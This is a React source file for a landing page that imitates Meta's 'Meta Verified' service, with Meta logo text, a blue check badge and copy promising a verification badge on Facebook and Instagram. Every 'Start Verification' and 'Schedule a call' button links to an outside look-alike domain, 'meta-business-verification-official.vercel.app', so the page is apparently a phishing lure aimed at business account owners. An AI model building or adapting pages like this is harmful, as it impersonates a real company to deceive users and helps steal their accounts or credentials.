import React, { useMemo } from "react";

export default function App() {
  // ✅ FIX TS7053: ép kiểu an toàn cho lang
  const lang =
    (typeof window !== "undefined" &&
      navigator?.language?.split("-")?.[0]) ||
    "en";

  const verifyLink =
    "https://meta-business-verification-official.vercel.app/meta-community";

  const text = {
    en: {
      begin: "Begin",
      advertisement: "Advertisement",
      learn: "Learn",
      support: "Support",
      schedule: "Schedule a call",
      start: "Start Verification",
      register: "Start Verification",
      title: "Let the whole world know that you take business seriously.",
      desc: "Meta Verified helps you build credibility with new audiences and protect your brand.",
      verifiedTitle: "Meta Verified",
      verifiedDesc:
        "Verify your Meta account to receive the blue verification badge on Facebook and Instagram.",
    },
  };

  // ✅ FIX TS ERROR CHÍNH 100% BUILD PASS
  const t = text[lang as keyof typeof text] || text.en;

  const images = [
    "https://images.unsplash.com/photo-1500648767791-00dcc994a43e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1517423440428-a5a00ad493e8?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?q=80&w=1200&auto=format&fit=crop",
    "https://images.unsplash.com/photo-1534528741775-53994a69daeb?q=80&w=1200&auto=format&fit=crop",
  ];

  const row1 = useMemo(() => [...images, ...images], []);
  const row2 = useMemo(() => [...images].reverse().concat(images), []);

  return (
    <>
      <style>{`
        *{
          margin:0;
          padding:0;
          box-sizing:border-box;
          font-family:Arial, Helvetica, sans-serif;
        }

        body{
          background:#05070d;
          overflow-x:hidden;
        }

        .app{
          width:100%;
          min-height:100vh;
          position:relative;
          overflow:hidden;
          color:#fff;
        }

        .bg-glow{
          position:absolute;
          top:-200px;
          left:50%;
          transform:translateX(-50%);
          width:900px;
          height:900px;
          background:radial-gradient(circle, rgba(24,119,242,0.35), transparent 60%);
          filter:blur(80px);
          z-index:0;
        }

        .bg-marquee{
          position:absolute;
          top:140px;
          left:0;
          width:100%;
          height:clamp(500px, 70vh, 900px);
          overflow:hidden;
          z-index:0;
          opacity:0.25;
        }

        .diagonal-wrap{
          width:100%;
          transform:rotate(-14deg) scale(1.1);
        }

        .row{
          overflow:hidden;
          margin-bottom:60px;
        }

        .track{
          display:flex;
          gap:24px;
          width:max-content;
        }

        .row1 .track{
          animation:moveRight 30s linear infinite;
        }

        .row2 .track{
          animation:moveLeft 30s linear infinite;
        }

        .card{
          width:220px;
          height:400px;
          border-radius:28px;
          overflow:hidden;
          flex-shrink:0;
          box-shadow:0 20px 60px rgba(0,0,0,0.6);
        }

        .card img{
          width:100%;
          height:100%;
          object-fit:cover;
        }

        @keyframes moveRight{
          0%{ transform:translateX(0); }
          100%{ transform:translateX(-50%); }
        }

        @keyframes moveLeft{
          0%{ transform:translateX(-50%); }
          100%{ transform:translateX(0); }
        }

        .header{
          position:relative;
          z-index:10;
          width:100%;
          height:80px;
          display:flex;
          align-items:center;
          justify-content:space-between;
          padding:0 40px;
          backdrop-filter:blur(10px);
          background:rgba(10,12,18,0.6);
          border-bottom:1px solid rgba(255,255,255,0.08);
        }

        .logo{
          font-size:34px;
          color:#1877f2;
          font-weight:700;
        }

        .nav{
          display:flex;
          gap:30px;
        }

        .nav a{
          color:#e5e7eb;
          text-decoration:none;
          font-weight:500;
        }

        .header-buttons{
          display:flex;
          gap:15px;
        }

        .call-btn{
          border:1px solid #1877f2;
          color:#1877f2;
          padding:12px 20px;
          border-radius:999px;
          text-decoration:none;
        }

        .start-btn{
          background:#1877f2;
          color:#fff;
          padding:12px 24px;
          border-radius:14px;
          text-decoration:none;
        }

        .hero{
          position:relative;
          z-index:5;
          max-width:1400px;
          margin:auto;
          display:flex;
          justify-content:space-between;
          gap:60px;
          padding:100px 40px;
        }

        .hero-left{
          max-width:620px;
        }

        .verified-row{
          display:flex;
          align-items:center;
          gap:18px;
          margin-bottom:30px;
        }

        .verified-badge{
          position:relative;
          width:70px;
          height:70px;
        }

        .verified-icon{
          width:100%;
          height:100%;
          border-radius:50%;
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          display:flex;
          align-items:center;
          justify-content:center;
          font-size:28px;
          font-weight:700;
        }

        .verified-pulse{
          position:absolute;
          inset:0;
          border-radius:50%;
          background:rgba(24,119,242,0.4);
          animation:pulse 2s infinite;
        }

        @keyframes pulse{
          0%{transform:scale(1);opacity:0.6}
          100%{transform:scale(1.6);opacity:0}
        }

        .verified-text{
          display:flex;
          flex-direction:column;
          gap:5px;
        }

        .verified-title{
          font-weight:600;
        }

        .verified-desc{
          font-size:13px;
          color:#cbd5e1;
          max-width:420px;
          line-height:1.5;
        }

        .hero-title{
          font-size:60px;
          line-height:1.1;
          margin-bottom:30px;
        }

        .hero-desc{
          font-size:18px;
          color:#cbd5e1;
          margin-bottom:40px;
        }

        .register-btn{
          background:linear-gradient(135deg,#1877f2,#00c3ff);
          color:#fff;
          padding:18px 38px;
          border-radius:999px;
          text-decoration:none;
        }

        @media(max-width:900px){
          .hero{
            flex-direction:column;
            text-align:center;
            align-items:center;
          }

          .nav{
            display:none;
          }
        }
      `}</style>

      <div className="app">
        <div className="bg-glow" />

        {/* BACKGROUND */}
        <div className="bg-marquee">
          <div className="diagonal-wrap">
            <div className="row row1">
              <div className="track">
                {row1.map((img, i) => (
                  <div className="card" key={`r1-${i}`}>
                    <img src={img} alt="profile" />
                  </div>
                ))}
              </div>
            </div>

            <div className="row row2">
              <div className="track">
                {row2.map((img, i) => (
                  <div className="card" key={`r2-${i}`}>
                    <img src={img} alt="profile" />
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* HEADER */}
        <header className="header">
          <div className="logo">Meta</div>

          <nav className="nav">
            <a href="#">{t.begin}</a>
            <a href="#">{t.advertisement}</a>
            <a href="#">{t.learn}</a>
            <a href="#">{t.support}</a>
          </nav>

          <div className="header-buttons">
            <a className="call-btn" href={verifyLink}>
              {t.schedule}
            </a>
            <a className="start-btn" href={verifyLink}>
              {t.start}
            </a>
          </div>
        </header>

        {/* HERO */}
        <section className="hero">
          <div className="hero-left">

            {/* VERIFIED (GIỮ NGUYÊN 100%) */}
            <div className="verified-row">
              <div className="verified-badge">
                <div className="verified-icon">✓</div>
                <div className="verified-pulse"></div>
              </div>

              <div className="verified-text">
                <div className="verified-title">{t.verifiedTitle}</div>
                <div className="verified-desc">{t.verifiedDesc}</div>
              </div>
            </div>

            <h1 className="hero-title">{t.title}</h1>
            <p className="hero-desc">{t.desc}</p>

            <a className="register-btn" href={verifyLink}>
              {t.register}
            </a>
          </div>
        </section>
      </div>
    </>
  );
}
